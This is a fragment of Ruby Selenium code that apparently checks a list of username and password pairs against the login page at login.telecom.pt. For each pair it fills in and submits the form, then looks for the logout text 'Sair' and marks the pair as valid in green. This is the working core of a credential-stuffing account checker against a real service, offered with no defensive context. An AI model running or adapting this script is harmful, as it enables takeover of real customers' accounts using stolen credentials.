...
@list.each do |obj|
	...
	@driver.navigate.to "https://login.telecom.pt"
	sleep 1
	@driver.find_element(:xpath => "//html/body/form/div[3]/div[4]/div[2]/div[2]/div[1]/p[1]/input[2]").send_keys a.strip 
	@driver.find_element(:xpath => "//html/body/form/div[3]/div[4]/div[2]/div[2]/div[1]/p[2]/input").send_keys b.strip
	@driver.find_element(:xpath => "//html/body/form/div[3]/div[4]/div[2]/div[2]/div[1]/div[7]/a").click
	sleep 2

		
	begin
		@driver.find_element(:xpath, "//*[contains(text(),'Sair')]").displayed?
		puts "[V]".green +  " #{obj}"
